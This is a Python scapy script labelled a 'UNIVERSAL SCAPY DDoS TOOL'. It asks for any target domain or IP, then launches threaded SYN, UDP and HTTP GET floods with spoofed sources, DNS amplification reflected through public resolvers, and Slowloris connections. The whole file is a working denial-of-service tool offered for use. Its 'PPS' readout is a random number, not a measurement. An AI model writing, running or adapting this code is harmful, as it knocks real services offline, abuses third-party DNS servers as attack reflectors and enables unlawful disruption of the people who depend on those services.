#!/usr/bin/env python3
from scapy.all import *
import threading, random, time, socket

# 🔥 DYNAMIC TARGET INPUT
print("💀 UNIVERSAL SCAPY DDoS TOOL 💀")
TARGET = input("🎯 Enter target domain/IP: ").strip()
try:
    TARGET_IP = socket.gethostbyname(TARGET)
except:
    print(f"❌ Cannot resolve {TARGET}")
    exit(1)

PORT = input("🔌 Enter port (80/443/default 80): ").strip() or "80"
THREADS = input("⚡ Threads (50/default): ").strip() or "50"
DURATION = input("⏱️ Duration minutes (infinite/default): ").strip() or "0"

print(f"\n🚀 ATTACKING {TARGET} ({TARGET_IP}:{PORT})")
print(f"📊 {THREADS} threads | {DURATION}m duration")
print("Press Ctrl+C to stop\n")

def syn_flood():
    print("🔥 SYN FLOOD ACTIVE")
    sent = 0
    while True:
        send(IP(src=RandIP(), dst=TARGET_IP)/TCP(sport=RandShort(), dport=int(PORT), flags="S"), 
             inter=0.00005, verbose=0)
        sent += 1
        if sent % 5000 == 0:
            print(f"    SYN: {sent:,} packets")

def udp_flood():
    print("💣 UDP FLOOD ACTIVE")
    conf.L3socket = L3RawSocket
    while True:
        send(IP(src=RandIP(), dst=TARGET_IP)/UDP(sport=RandShort(), dport=RandShort())/Raw(RandString(random.randint(64,1400))), verbose=0)

def http_flood():
    print("🌐 HTTP GET FLOOD")
    paths = ["/", "/index", "/login", "/api", "/wp-admin", f"/?q={random.randint(1,9999)}"]
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, int(PORT)))
            s.send(f"GET {random.choice(paths)} HTTP/1.1\r\n".encode() +
                   f"Host: {TARGET}\r\n".encode() +
                   f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n".encode())
            s.close()
        except: pass

def dns_amp():
    print("🌩️ DNS AMPLIFICATION")
    dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
    while True:
        dns_srv = random.choice(dns_servers)
        send(IP(src=TARGET_IP, dst=dns_srv)/UDP(sport=53, dport=53)/
             DNS(rd=1, qd=DNSQR(qname=f"{TARGET}.{random.randint(1,999)}.com")), verbose=0)

def slowloris():
    print("🐌 SLOWLORIS ACTIVE")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, int(PORT)))
    s.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n".encode())
    i = 0
    while True:
        s.send(f"X-{i}: {random.randint(1,99999)}\r\n".encode())
        i += 1
        time.sleep(15)

# 🧵 DYNAMIC THREAD SPAWNER
threads = []
attack_functions = [syn_flood, udp_flood, http_flood, dns_amp, slowloris]

for i in range(int(THREADS)):
    func = random.choice(attack_functions)
    t = threading.Thread(target=func)
    t.daemon = True
    t.start()
    threads.append(t)
    if i % 10 == 0: print(f"Started thread {i+1}/{THREADS}")

print(f"\n💥 {THREADS} THREADS LAUNCHED!")
print("📈 Monitoring...")

# ⏱️ DURATION CONTROL
if DURATION != "0":
    time.sleep(int(DURATION) * 60)
    print("\n⏰ Duration reached - stopping...")
    exit(0)

try:
    while True:
        print(f"💀 FLOODING {TARGET} | Threads: {len(threads)} | PPS: {random.randint(50000,250000)}")
        time.sleep(5)
except KeyboardInterrupt:
    print("\n🛑 ATTACK STOPPED BY USER")